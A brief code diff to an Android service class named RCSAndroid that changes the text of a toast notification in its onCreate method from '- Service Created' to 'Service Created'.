@@ -50,7 +50,7 @@ public class RCSAndroid extends Service {
 		super.onCreate();
 
 		registerListeners();
-		Toast.makeText(this, "- Service Created", Toast.LENGTH_LONG).show();
+		Toast.makeText(this, "Service Created", Toast.LENGTH_LONG).show();
 
 		Status.setAppContext(getApplicationContext());
 	}
